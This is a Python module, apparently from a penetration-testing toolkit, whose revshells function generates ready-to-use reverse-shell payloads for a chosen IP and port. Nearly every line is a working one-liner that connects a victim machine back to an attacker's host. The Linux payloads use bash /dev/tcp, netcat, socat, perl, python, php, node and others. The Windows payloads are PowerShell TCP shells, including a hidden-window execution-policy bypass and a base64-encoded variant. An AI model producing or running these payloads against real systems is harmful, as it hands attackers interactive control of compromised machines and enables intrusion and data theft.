from .util_basic import *

def revshells(ip, port, linux=True, udp=False, tcp=True, tls=False, windows=False):
    # Majority is from https://github.com/0dayCTF/reverse-shell-generator
    # TODO: test windows payloads
    if linux:
        if tcp:
            yield f"bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'"
            yield f'sh -i >& /dev/tcp/{ip}/{port} 0>&1'
            yield f'0<&196;exec 196<>/dev/tcp/{ip}/{port};sh <&196 >&196 2>&196'
            yield f'exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read line;do $line 2>&5 >&5;done'
            yield f'sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'
            yield f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f'
            yield f'nc {ip} {port} -e /bin/sh'
            yield f'busybox nc {ip} {port} -e /bin/sh'
            yield f'nc -c sh {ip} {port}'
            yield f'ncat {ip} {port} -e /bin/sh'
            yield f"""perl -e 'use Socket;$i="{ip}";$p={port};"""+"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"""
            yield f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
            yield f"""php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");'"""
            yield f"""python -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
            yield f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
            yield f"""python2.7 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
            yield f"""node -e 'sh=require("child_process").spawn("/bin/sh");require("net").connect({port},"{ip}","""+"""function(){this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);})'"""
            yield f"""ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'"""
            yield f"""socat TCP:{ip}:{port} EXEC:sh"""
            yield f"""TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF|sh 1>$TF"""
            yield f"""zsh -c 'zmodload zsh/net/tcp&&ztcp {ip} {port}&&zsh>&$REPLY 2>&$REPLY 0>&$REPLY'"""
            yield f'''lua -e "t=require('socket').tcp();t:connect('{ip}','{port}');os.execute('sh -i <&3 >&3 2>&3');"'''
            yield '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'''+f'''{ip}:{port}"'''+''');cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'>/tmp/t.go&&go run /tmp/t.go&&rm /tmp/t.go'''
        if udp:
            yield f'sh -i >& /dev/udp/{ip}/{port} 0>&1'
            yield f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ip} {port} >/tmp/f'
        if tls:
            yield f'mkfifo /tmp/s;sh -i < /tmp/s 2>&1|openssl s_client -quiet -connect {ip}:{port} >/tmp/s;rm /tmp/s'
    if windows:
        if tcp:
            yield f'nc.exe {ip} {port} -e sh'
            yield f'ncat.exe {ip} {port} -e sh'
            yield f"""$LHOST = "{ip}"; $LPORT = {port};"""+""" $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"""
            yield f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"""+'''stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''
            yield f'''powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});'''+'''$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'''
            yield f'''$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});'''+'''$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''
            stuff = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});'+'''$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
            v = b2s(b64e(''.join([x+'\x00' for x in stuff])))
            yield 'powershell -e '+v




